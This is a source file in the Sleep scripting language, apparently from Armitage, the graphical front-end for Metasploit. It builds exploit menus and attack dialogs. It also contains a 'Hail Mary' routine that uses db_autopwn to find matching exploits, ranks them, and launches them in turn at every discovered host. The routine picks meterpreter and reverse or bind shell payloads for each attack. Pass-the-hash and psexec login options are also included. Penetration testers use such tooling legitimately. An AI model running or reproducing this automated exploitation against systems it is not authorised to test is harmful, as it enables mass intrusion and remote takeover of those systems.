#
# Code to create the various attack menus based on db_autopwn
#
import java.awt.*;
import java.awt.event.*;

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

import msf.*;
import table.*;

global('%results @always_reverse %exploits %results2');
%results = ohash();
%results2 = ohash();
setMissPolicy(%results, { return @(); });
setMissPolicy(%results2, { return @(); });

# %exploits is populated in menus.sl when the client-side attacks menu is constructed

# a list of exploits that should always use a reverse shell... this list needs to grow.
@always_reverse = @("multi/samba/usermap_script", "unix/misc/distcc_exec");

#
# generate menus for a given OS
#
sub exploit_menus {
	local('%toplevel @allowed $ex $os $port $exploit');
	%toplevel = ohash();
	@allowed = getOS($1);

	foreach $ex ($2) {
		($os, $port, $exploit) = split('/', $ex);
		if ($os in @allowed) {
			if ($port !in %toplevel) {
				%toplevel[$port] = %();
			}
			%toplevel[$port][$exploit] = $ex;
		}
	}

	local('%r $menu $exploits $name $exploit');

	%r = ohash();
	putAll(%r, sorta(keys(%toplevel)), { return 1; });
	foreach $menu => $exploits (%r) {
		$exploits = ohash();
		foreach $name (sorta(keys(%toplevel[$menu]))) {
			$exploits[$name] = %toplevel[$menu][$name];
		}
	}

	return %r;
}

sub targetsCombobox {
	local('$key $value @targets $combobox');
	foreach $key => $value ($1["targets"]) {
		if (strlen($value) > 53) {
			push(@targets, "$key => " . substr($value, 0, 50) . "...");
		}
		else {
			push(@targets, "$key => $value");
		}
	}

	$combobox = [new JComboBox: sort({
		local('$a $b');
		$a = int(split(' \=\> ', $1)[0]);
		$b = int(split(' \=\> ', $2)[0]);
		return $a <=> $b;
	}, @targets)];

	return $combobox;
}

sub getOS {
	local('@allowed');
	if ($1 eq "Windows") { @allowed = @("windows", "multi"); }
	else if ($1 eq "Solaris") { @allowed = @("solaris", "multi", "unix"); }
	else if ($1 eq "Linux") { @allowed = @("linux", "multi", "unix"); }
	else if ($1 eq "Mac OS X") { @allowed = @("osx", "multi", "unix"); }
	else if ($1 eq "FreeBSD") { @allowed = @("freebsd", "multi", "unix"); }
	else { @allowed = @("multi", "unix"); }
	return @allowed;
}

# findAttacks("p", "good|great|excellent", &callback) - port analysis 
# findAttacks("x", "good|great|excellent", &callback) - vulnerability analysis
sub resolveAttacks {
	%results = ohash();
	%results2 = ohash();
	setMissPolicy(%results, { return @(); });
	setMissPolicy(%results2, { return @(); });

        local('$tmp_console');
        $tmp_console = createConsole($client);

	cmd($client, $tmp_console, "db_autopwn -t - $+ $1 -R $2", lambda({
		local('$line $ip $exploit $port');

		foreach $line (split("\n", $3)) {
			if ($line ismatch '\[\*\]\s+(.*?):(\d+).*?exploit/(.*?/.*?/.*?)\s.*') {
				($ip, $port, $exploit) = matched();
				push(%results[$ip], $exploit);
				push(%results2[$ip], @($exploit, $port));
			}
		}

		[$action];
		call($client, "console.destroy", $tmp_console);
	}, \$tmp_console, $action => $3));
}

sub findAttacks {
	resolveAttacks($1, $2, {
		showError("Attack Analysis Complete...\n\nYou will now see an 'Attack' menu attached\nto each host in the Targets window.\n\nHappy hunting!");
	});
}

sub smarter_autopwn {
	local('$console');
	elog("has given up and launched the hail mary!");

	$console = createConsoleTab("Hail Mary", 1);
	[[$console getWindow] append: "\n\n1) Finding exploits (via db_autopwn)\n\n"];

	resolveAttacks($1, $2, lambda({
		# now crawl through %results and start hacking each host in turn
		local('$host $exploits @allowed $ex $os $port $exploit @attacks %dupes $e $p');

		# filter the attacks...
		foreach $host => $exploits (%results2) {
			%dupes = %();
			@allowed = getOS(getHostOS($host));

			foreach $e ($exploits) {
				($ex, $p) = $e;
				($os, $port, $exploit) = split('/', $ex);
				if ($os in @allowed && $ex !in %dupes) {
					push(@attacks, @("$host", "$ex", best_payload($host, $ex, iff($ex in @always_reverse)), $p, %exploits[$ex]));
					%dupes[$ex] = 1;
				}
			}
			[[$console getWindow] append: "\t[ $+ $host $+ ] Found " . size($exploits) . " exploits\n" ];
		}

		[[$console getWindow] append: "\n2) Sorting Exploits\n"];

		# now sort them, so the best ones are on top...
		sort({
			local('$a $b');
			if ($1[1] !in %exploits) {
				return 1;
			}
			if ($2[1] !in %exploits) {
				return -1;
			}

			$a = %exploits[$1[1]];
			$b = %exploits[$2[1]];

			if ($a['rankScore'] eq $b['rankScore']) {
				return $b['date'] <=> $a['date'];
			}

			return $b['rankScore'] <=> $a['rankScore'];
		}, @attacks);

		[[$console getWindow] append: "\n3) Launching Exploits\n\n"];

		# now execute them...
		local('$progress');
		$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];

		thread(lambda({
			local('$host $ex $payload $x $rport %wait');
			while (size(@attacks) > 0 && [$progress isCanceled] == 0) {
				($host, $ex, $payload, $rport) = @attacks[0];

				# let's throttle our exploit/host velocity a little bit.
				if ((ticks() - %wait[$host]) > 1250) {
					yield 250;
				}
				else {
					yield 1500;
				}

				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
				[$progress setProgress: $x + 0];
				call($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1')));
				%wait[$host] = ticks();
				$x++; 
				@attacks = sublist(@attacks, 1);
			}
			[$progress close];

			[[$console getWindow] append: "\n\n4) Listing sessions\n\n"];
			[$console sendString: "sessions -v\n"];
		}, \@attacks, \$progress, \$console));
	}, \$console));
}

# choose a payload...
# best_client_payload(exploit, target) 
sub best_client_payload {
	local('$os');
	$os = split('/', $1)[0];

	if ($os eq "windows" || "*Windows*" iswm $2) {
		return "windows/meterpreter/reverse_tcp";
	}
	else if ("*Generic*Java*" iswm $2) {
		return "java/meterpreter/reverse_tcp";
	}
	else if ("*Mac*OS*PPC*" iswm $2 || ($os eq "osx" && "*PPC*" iswm $2)) {
		return "osx/ppc/shell/reverse_tcp";
	}
	else if ("*Mac*OS*x86*" iswm $2 || $os eq "osx") {
		return "osx/x86/vforkshell/reverse_tcp";
	}
	else {
		return "generic/shell_reverse_tcp";
	}
}

# choose a payload...
# best_payload(host, exploit, reverse preference)
sub best_payload {
	local('$compatible $os');
	$compatible = call($client, "module.compatible_payloads", $2)["payloads"];
	$os = iff($1 in %hosts, %hosts[$1]['os_name']);

	if ($3) {
		if (($os eq "Windows" || "windows" isin $2) && "windows/meterpreter/reverse_tcp" in $compatible) {
			return "windows/meterpreter/reverse_tcp";
		}
		else if (($os eq "Windows" || "windows" isin $2) && "windows/shell/reverse_tcp" in $compatible) {
			return "windows/shell/reverse_tcp";
		}
		else if ("java/meterpreter/reverse_tcp" in $compatible) {
			return "java/meterpreter/reverse_tcp";
		}
		else if ("java/shell/reverse_tcp" in $compatible) {
			return "java/shell/reverse_tcp";
		}
		else if ("java/jsp_shell_reverse_tcp" in $compatible) {
			return "java/jsp_shell_reverse_tcp";
		}
		else {
			return "generic/shell_reverse_tcp";
		}
	}
	
	if (($os eq "Windows" || "windows" isin $2) && "windows/meterpreter/bind_tcp" in $compatible) {
		return "windows/meterpreter/bind_tcp";
	}
	else if (($os eq "Windows" || "windows" isin $2) && "windows/shell/bind_tcp" in $compatible) {
		return "windows/shell/bind_tcp";
	}
	else if ("java/meterpreter/bind_tcp" in $compatible) {
		return "java/meterpreter/bind_tcp";
	}
	else if ("java/shell/bind_tcp" in $compatible) {
		return "java/shell/bind_tcp";
	}
	else if ("java/jsp_shell_bind_tcp" in $compatible) {
		return "java/jsp_shell_bind_tcp";
	}
	else {
		return "generic/shell_bind_tcp";
	}
}

sub addAdvanced {
	local('$d');
	$d = [new JCheckBox: " Show advanced options"];
	[$d addActionListener: lambda({
		[$model showHidden: [$d isSelected]];
		[$model fireListeners];
	}, \$model, \$d)];
	return $d;
}

#
# pop up a dialog to start our attack with... fun fun fun
#
sub attack_dialog {
	local('$dialog $north $center $south $center @targets $combobox $label $textarea $scroll $model $key $table $sorter $col $d $b $c $button $x $value');
	$dialog = dialog("Attack " . join(', ', $3), 590, 360);

	$north = [new JPanel];
	[$north setLayout: [new BorderLayout]];
	
	$label = [new JLabel: $1["name"]];
	[$label setBorder: [BorderFactory createEmptyBorder: 5, 5, 5, 5]];

	[$north add: $label, [BorderLayout NORTH]];

	$textarea = [new JTextArea: [join(" ", split('[\\n\\s]+', $1["description"])) trim]];
	[$textarea setEditable: 0];
	[$textarea setOpaque: 0];
	[$textarea setLineWrap: 1];
	[$textarea setWrapStyleWord: 1];
	[$textarea setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];
	$scroll = [new JScrollPane: $textarea];
	[$scroll setPreferredSize: [new Dimension: 480, 80]];
	[$scroll setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];

	[$north add: $scroll, [BorderLayout CENTER]];

	$model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
	[$model setCellEditable: 1];
	foreach $key => $value ($2) {	
		if ($key eq "RHOST") {
			$value["default"] = join(", ", $3);
		}
		
		[$model _addEntry: %(Option => $key, 
					Value => $value["default"], 
					Tooltip => $value["desc"], 
					Hide => 
						iff($value["advanced"] eq '0' && $value["evasion"] eq '0', '0', '1')
				)
		]; 
	}
	[$model _addEntry: %(Option => "LHOST", Value => $MY_ADDRESS, Tooltip => "Address (for connect backs)", Hide => '0')];
	[$model _addEntry: %(Option => "LPORT", Value => randomPort(), Tooltip => "Bind meterpreter to this port", Hide => '0')];

	$table = [new JTable: $model];
	$sorter = [new TableRowSorter: $model];
        [$sorter toggleSortOrder: 0];
	[$table setRowSorter: $sorter];
	addFileListener($table, $model);

	foreach $col (@("Option", "Value")) {
		[[$table getColumn: $col] setCellRenderer: lambda({
			local('$render $v');
			$render = [$table getDefaultRenderer: ^String];
			$v = [$render getTableCellRendererComponent: $1, $2, $3, $4, $5, $6];
			[$v setToolTipText: [$model getValueAtColumn: $table, $5, "Tooltip"]];
			return $v;
		}, \$table, \$model)];
	}

	$center = [new JScrollPane: $table];
	
	$south = [new JPanel];
	[$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
	#[$south setLayout: [new GridLayout: 4, 1]];
	
	$d = addAdvanced(\$model);

	$combobox = targetsCombobox($1);

	$b = [new JCheckBox: " Use a reverse connection"];

	if ($4 in @always_reverse) {
		[$b setSelected: 1];
	}

	$c = [new JPanel];
	[$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];

	$button = [new JButton: "Launch"];
	[$button addActionListener: lambda({
		local('$options $host $x');
		syncTable($table);

		$options = %();
	
		for ($x = 0; $x < [$model getRowCount]; $x++) {
			$options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
		}

		$options["TARGET"] = split(' \=\> ', [$combobox getSelectedItem])[0];

		foreach $host (split(', ', $options["RHOST"])) {
			$options["PAYLOAD"] = best_payload($host, $exploit, [$b isSelected]);
			$options["RHOST"] = $host;
			warn("$host -> $exploit -> $options");
			call($client, "module.execute", "exploit", $exploit, $options);
		}

		[$dialog setVisible: 0];

		elog("exploit $exploit @ " . $options["RHOST"]);
	}, $exploit => $4, \$model, \$combobox, \$dialog, \$b, \$table)];

	[$c add: $button];

	[$south add: left([new JLabel: "Targets: "], $combobox)];
	[$south add: left($b)];
	[$south add: left($d)];
	[$south add: $c];

	[$dialog add: $north, [BorderLayout NORTH]];
	[$dialog add: $center, [BorderLayout CENTER]];
	[$dialog add: $south, [BorderLayout SOUTH]];

	[$button requestFocus];

	[$dialog setVisible: 1];
}

# db_autopwn("p", "good|great|excellent") - port analysis 
sub db_autopwn {
	local('$console');
	$console = createConsoleTab("db_autopwn", 1);
	[$console sendString: "db_autopwn -r -e - $+ $1 -R $2 -T 20\n"];
}

sub min_rank {
	return [$preferences getProperty: "armitage.required_exploit_rank.string", "great"];
}

sub host_attack_items {
	local('%m');

	# we're going to take the OS of the first host...
	%m = exploit_menus(%hosts[$2[0]]['os_name'], %results[$2[0]]);

	if (size(%m) > 0) {
		local('$a $service $exploits $e $name $exploit');

		$a = menu($1, "Attack", 'A');

		foreach $service => $exploits (%m) {
			$e = menu($a, $service, $null);
			foreach $name => $exploit  ($exploits) {
				item($e, $name, $null, lambda({
					local('$a $b'); 
					$a = call($client, "module.info", "exploit", $exploit);
					$b = call($client, "module.options", "exploit", $exploit);
					attack_dialog($a, $b, $hosts, $exploit);
				}, \$exploit, $hosts => $2));
			}
	
			if ($service eq "smb") {
				item($e, "pass the hash...", 'p', lambda(&pass_the_hash, $hosts => $2));
			}

			if (size($exploits) > 0) {
				separator($e);
				item($e, "check exploits...", 'c', lambda({
					local('$console');
					$console = createConsoleTab("Check Exploits", 1);
					thread(lambda({
						local('$result $h');
						$h = $hosts[0];
						foreach $result (values($exploits)) {
							[[$console getWindow] append: "\n\n===== Checking $result =====\n\n"];
							[$console sendString: "use $result $+ \n"];
							yield 250L;
							[$console sendString: "set RHOST $h $+ \n"];
							yield 250L;
							[$console sendString: "check\n"];
							yield 1000L;
						}
					}, \$hosts, \$exploits, \$console));
				}, $hosts => $2, \$exploits));
			}
		}
	}

	local('$service $name @options $a $port $foo');

	foreach $port => $service (%hosts[$2[0]]['services']) {
		$name = $service['name'];
		if ("scanner/ $+ $name $+ / $+ $name $+ _login" in @auxiliary) {
			push(@options, @($name, lambda(&show_login_dialog, \$service, $hosts => $2)));
		}
		else if ($name eq "microsoft-ds") {
			push(@options, @("psexec", lambda(&pass_the_hash, $hosts => $2)));
		}
	}

	if (size(@options) > 0) {
		$a = menu($1, 'Login', 'L');
		foreach $service (@options) {
			($name, $foo) = $service;
			item($a, $name, $null, $foo);
		}
	}
}

sub addFileListener {
	local('$table $model');
	($table, $model) = @_; 
     
	[$table addMouseListener: lambda({
                if ($0 eq 'mouseClicked' && [$1 getClickCount] >= 2) {
			local('$type $row $file $value');

			$value = [$model getSelectedValueFromColumn: $table, "Value"];
			$type = [$model getSelectedValueFromColumn: $table, "Option"];
			$row = [$model getSelectedRow: $table];

			if ("*FILE*" iswm $type) {
				local('$title');
				$title = "Select $type";
				$file = iff($value eq "", chooseFile(\$title, $dir => "/opt/metasploit3/msf3/data"), chooseFile(\$title, $sel => $value));
				if ($file !is $null) {
					[$model setValueAtRow: $row, "Value", $file];
					[$model fireListeners];
				}
			}
		}
	}, \$model, \$table)];
}